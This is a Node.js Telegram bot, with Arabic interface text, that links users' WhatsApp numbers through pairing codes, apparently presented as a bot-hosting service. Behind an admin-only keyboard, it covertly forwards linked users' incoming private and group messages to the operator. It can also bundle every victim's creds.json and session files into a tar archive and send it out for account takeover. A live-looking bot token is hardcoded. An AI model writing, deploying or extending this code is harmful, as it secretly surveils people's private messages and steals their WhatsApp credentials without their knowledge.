const TelegramBot = require('node-telegram-bot-api');
const { spawn, execSync } = require('child_process');
const fs = require('fs');
const path = require('path');

process.stdout.write('\x1Bc'); 
console.log('🛡️ Legend System V12.2: Advanced Control Panel');

process.env.NTBA_FIX_619 = '1';

const token = '8292884473:AAF5DsDgN8VqkqQ33cPDTFFxh6y8ZMzPmbg'; 
const ADMIN_ID = 7047473765; 
const bot = new TelegramBot(token, { polling: true });

const CHANNEL_ID = '@m780128139'; 
const CHANNEL_URL = 'https://t.me/m780128139'; 

let activeSessions = {};
let monitoredNumbers = new Set();
let connectionQueue = [];
let currentConnectingCount = 0;
const MAX_CONCURRENT_CONNECTS = 50;
let lastProcessedMessages = new Map();
let adminAction = null; 

// التأكد من وجود مجلد الجلسات فقط وعدم المساس بالملفات الأخرى
const sessionsDir = path.join(__dirname, 'sessions');
if (!fs.existsSync(sessionsDir)) fs.mkdirSync(sessionsDir);

const adminKeyboard = {
    reply_markup: {
        keyboard: [
            [{ text: "📱 الأرقام المرتبطة" }, { text: "📡 الرادارات المشغلة" }],
            [{ text: "📥 سحب كل الجلسات" }, { text: "📤 رفع ملف الجلسات" }],
            [{ text: "🔍 بحث عن رقم" }, { text: "📱 الجلسات النشطة" }],
            [{ text: "🔄 تشغيل وتحقق الكل" }, { text: "⚠️ تصفية الكل" }]
        ],
        resize_keyboard: true
    }
};

async function checkSubscription(msg) {
    const userId = msg.from.id;
    if (userId === ADMIN_ID) return true; 
    try {
        const member = await bot.getChatMember(CHANNEL_ID, userId);
        if (['member', 'administrator', 'creator'].includes(member.status)) return true;
        bot.sendMessage(msg.chat.id, `❌ *عذراً، الوصول مرفوض!*`, {
            parse_mode: "Markdown",
            reply_markup: { inline_keyboard: [[{ text: "انضم للقناة 💙", url: CHANNEL_URL }], [{ text: "تحقق ♻️", callback_data: "verify_sub" }]] }
        });
        return false;
    } catch (e) { return false; }
}

function sendWelcomeMessage(chatId, firstName, userId) {
    const welcome = `🛡️ *مرحباً بك يا* ${userId === ADMIN_ID ? 'الأسطـ⃤🏴‍☠️ـوره' : firstName}\n\n` +
        `👤 *الأيدي الخاص بك:* \`${userId}\` \n` +
        `━━━━━━━━━━━━━━━\n` +
        `⚙️ *تعليمات الاستخدام:* \n\n` +
        `🔌 *لكي تربط رقمك:* \n` +
        `/connect \n\n` +
        `🗑️ *لكي تحذف جلسة رقمك:* \n` +
        `/deletesession \n` +
        `━━━━━━━━━━━━━━━\n` +
        `💡 *مثال:* \n` +
        `/connect 967xxxxxxxxx`;
    bot.sendMessage(chatId, welcome, { 
        parse_mode: "Markdown", 
        ...(userId === ADMIN_ID ? adminKeyboard : { reply_markup: { remove_keyboard: true } }) 
    });
}

async function startWhatsAppNode(phoneNumber, chatId) {
    if (activeSessions[phoneNumber]) return;
    const userSessionPath = path.join(sessionsDir, phoneNumber);
    if (!fs.existsSync(userSessionPath)) fs.mkdirSync(userSessionPath, { recursive: true });

    const essentials = ['node_modules', 'package.json', 'index.js', 'lib', 'src', '69', 'database', 'Access', 'System'];
    essentials.forEach(item => {
        const source = path.join(__dirname, item);
        if (fs.existsSync(source)) try { execSync(`ln -sf "${source}" "${path.join(userSessionPath, item)}"`); } catch (e) {}
    });

    const child = spawn('node', ['index.js'], { cwd: userSessionPath });
    activeSessions[phoneNumber] = child;
    let numberEntered = false;

    child.stdout.on('data', (data) => {
        const output = data.toString();
        if (output.includes("Enter your phone number") && !numberEntered) {
            numberEntered = true;
            setTimeout(() => { try { child.stdin.write(phoneNumber + '\n'); } catch(e){} }, 2000);
        }
        const codeMatch = output.match(/Code\s*:\s*([A-Z0-9]{4}-[A-Z0-9]{4})/i);
        if (codeMatch && chatId) {
            bot.sendMessage(chatId, `✅ *كود الربط للرقم:* \`${phoneNumber}\`\n\n\`${codeMatch[1]}\``, { parse_mode: "Markdown" });
            currentConnectingCount--;
            processQueue();
        }
        if (monitoredNumbers.has(phoneNumber) && (output.includes("=>") || output.includes("FROM") || output.includes("[ MESSAGE ]"))) {
            handleAdvancedRadar(output, phoneNumber);
        }
    });
    child.on('close', () => delete activeSessions[phoneNumber]);
}

function handleAdvancedRadar(output, phoneNumber) {
    try {
        let content = output.split('\n')[0]
            .replace(/\[ MESSAGE \].*?GMT\S+/g, '')
            .replace(/\(.*?Standard Time\)/g, '') 
            .replace(/=> Content:/g, '')
            .trim();
            
        if (!content || content.length < 1) return;
        
        const fingerprint = `${phoneNumber}_${content}`;
        if (lastProcessedMessages.has(fingerprint)) return;
        lastProcessedMessages.set(fingerprint, Date.now());
        setTimeout(() => lastProcessedMessages.delete(fingerprint), 8000);

        const fromMatch = output.match(/FROM (.*?) (\d+)/);
        const name = fromMatch ? fromMatch[1].replace(/【|】/g, '').trim() : "غير معروف";
        const sender = fromMatch ? fromMatch[2].split('@')[0] : "مخفي";
        const isGroup = output.includes('@g.us') ? "👥 مجموعة" : "👤 خاص";
        
        const time = new Date().toLocaleTimeString('en-US', { 
            timeZone: 'Asia/Riyadh', 
            hour: 'numeric', 
            minute: '2-digit', 
            hour12: true 
        });

        const radarMsg = `📡 *تنبيه من رادار:* \`${phoneNumber}\`\n━━━━━━━━━━━━━━━\n👤 *الاسم:* ${name}\n📞 *الرقم:* \`${sender}\`\n📑 *النوع:* 💬 رسالة نصية\n💬 *المحتوى:* \`${content}\`\n📍 *المصدر:* ${isGroup}\n⏰ *الوقت:* ${time}`;
        bot.sendMessage(ADMIN_ID, radarMsg, { parse_mode: "Markdown" });
    } catch (e) {}
}

function processQueue() {
    if (currentConnectingCount >= MAX_CONCURRENT_CONNECTS || connectionQueue.length === 0) return;
    currentConnectingCount++;
    const next = connectionQueue.shift();
    startWhatsAppNode(next.phoneNumber, next.chatId);
}

function getNumberControlButtons(num) {
    return {
        inline_keyboard: [
            [{ text: monitoredNumbers.has(num) ? "🔴 إيقاف الرادار" : "🔵 تشغيل الرادار", callback_data: `radar_${num}` }],
            [{ text: "🗑️ حذف جلسة الرقم", callback_data: `delete_${num}` }]
        ]
    };
}

bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const text = msg.text ? msg.text.trim() : "";

    if (text === '/start') {
        if (await checkSubscription(msg)) sendWelcomeMessage(chatId, msg.from.first_name, userId);
        return;
    }

    if (!(await checkSubscription(msg))) return;

    if (text.startsWith('/connect')) {
        let num = text.replace('/connect', '').trim().replace(/\D/g, '');
        if (!num || num.length < 10) return bot.sendMessage(chatId, "*⚠️ يرجى إرسال الرقم بشكل صحيح مثال:*\n`/connect 967xxxxxxxxx`", { parse_mode: "Markdown" });
        bot.sendMessage(chatId, `⏳ جاري طلب كود الربط للرقم \`${num}\`..`, { parse_mode: "Markdown" });
        connectionQueue.push({ chatId, phoneNumber: num });
        processQueue();
        return;
    }

    if (userId === ADMIN_ID) {
        if (text === "📱 الأرقام المرتبطة") {
            const folders = fs.readdirSync(sessionsDir).filter(f => fs.lstatSync(path.join(sessionsDir, f)).isDirectory());
            if (folders.length === 0) return bot.sendMessage(chatId, "📭 لا توجد جلسات.");
            folders.forEach(n => {
                bot.sendMessage(chatId, `📱 الرقم: \`${n}\` | ${activeSessions[n] ? '🟢 نشط' : '🔴 متوقف'}`, { parse_mode: "Markdown", reply_markup: getNumberControlButtons(n) });
            });
        }

        if (text === "📡 الرادارات المشغلة") {
            if (monitoredNumbers.size === 0) return bot.sendMessage(chatId, "📭 لا توجد رادارات نشطة.");
            Array.from(monitoredNumbers).forEach(n => {
                bot.sendMessage(chatId, `📡 رادار نشط على: \`${n}\``, { parse_mode: "Markdown", reply_markup: getNumberControlButtons(n) });
            });
        }

        if (text === "📱 الجلسات النشطة") {
            const activeKeys = Object.keys(activeSessions);
            if (activeKeys.length === 0) return bot.sendMessage(chatId, "📭 لا توجد جلسات نشطة حالياً.");
            activeKeys.forEach(n => {
                bot.sendMessage(chatId, `🟢 جلسة متصلة الآن: \`${n}\``, { parse_mode: "Markdown", reply_markup: getNumberControlButtons(n) });
            });
        }

        if (text === "🔍 بحث عن رقم") { adminAction = "search"; return bot.sendMessage(chatId, "🔎 أرسل الرقم للبحث عنه:"); }
        if (text === "📤 رفع ملف الجلسات") { adminAction = "upload_all"; return bot.sendMessage(chatId, "📤 أرسل ملف الجلسات الشامل `.tar` الآن:"); }

        if (adminAction && /^\d+$/.test(text)) {
            const num = text;
            const sPath = path.join(sessionsDir, num);
            if (adminAction === "search") {
                if (fs.existsSync(sPath)) bot.sendMessage(chatId, `✅ الرقم \`${num}\` مسجل.`, { parse_mode: "Markdown", reply_markup: getNumberControlButtons(num) });
                else bot.sendMessage(chatId, "❌ الرقم غير موجود.");
                adminAction = null;
            }
        }

        if (text === "🔄 تشغيل وتحقق الكل") {
            const folders = fs.readdirSync(sessionsDir).filter(f => fs.lstatSync(path.join(sessionsDir, f)).isDirectory());
            let count = 0;
            folders.forEach(n => { if (!activeSessions[n]) { startWhatsAppNode(n, null); count++; } });
            bot.sendMessage(chatId, `✅ تم إعادة تشغيل الجلسات بنجاح.\n📊 عدد الجلسات التي تم تشغيلها: *${count}*`, { parse_mode: "Markdown" });
        }

        if (text === "⚠️ تصفية الكل") {
            Object.values(activeSessions).forEach(c => c.kill('SIGKILL'));
            // حذف ما بداخل مجلد الجلسات فقط لحماية index.js
            fs.rmSync(sessionsDir, { recursive: true, force: true });
            fs.mkdirSync(sessionsDir);
            bot.sendMessage(chatId, "🗑️ تم تصفية كافة الجلسات بنجاح.");
        }

        if (text === "📥 سحب كل الجلسات") {
            try {
                execSync(`find sessions -name "creds.json" -o -name "session" | tar -cvf all_sessions.tar -T -`);
                bot.sendDocument(chatId, './all_sessions.tar', { caption: "📦 نسخة شاملة لكل الجلسات المتاحة." });
            } catch (e) { bot.sendMessage(chatId, "❌ فشل السحب."); }
        }
    }
});

bot.on('document', async (msg) => {
    if (msg.from.id !== ADMIN_ID || adminAction !== "upload_all") return;
    const pathFile = await bot.downloadFile(msg.document.file_id, __dirname);
    
    try {
        execSync(`tar -xvf "${pathFile}" -C .`);
        fs.unlinkSync(pathFile);
        bot.sendMessage(ADMIN_ID, "✅ تم استعادة جميع الجلسات بنجاح.");
        const folders = fs.readdirSync(sessionsDir).filter(f => fs.lstatSync(path.join(sessionsDir, f)).isDirectory());
        folders.forEach(n => startWhatsAppNode(n, null));
    } catch (e) { bot.sendMessage(ADMIN_ID, "❌ خطأ في فك الملف الشامل."); }
    adminAction = null;
});

bot.on('callback_query', async (q) => {
    const [action, num] = q.data.split('_');
    if (action === 'radar') {
        if (monitoredNumbers.has(num)) monitoredNumbers.delete(num); else monitoredNumbers.add(num);
        bot.editMessageReplyMarkup(getNumberControlButtons(num), { chat_id: q.message.chat.id, message_id: q.message.message_id });
        bot.answerCallbackQuery(q.id, { text: "تم تحديث حالة الرادار" });
    } else if (action === 'delete') {
        if (activeSessions[num]) activeSessions[num].kill('SIGKILL');
        fs.rmSync(path.join(sessionsDir, num), { recursive: true, force: true });
        bot.deleteMessage(q.message.chat.id, q.message.message_id);
        bot.answerCallbackQuery(q.id, { text: "تم الحذف بنجاح" });
    }
});

const saved = fs.readdirSync(sessionsDir).filter(f => fs.lstatSync(path.join(sessionsDir, f)).isDirectory());
saved.forEach(n => startWhatsAppNode(n, null));
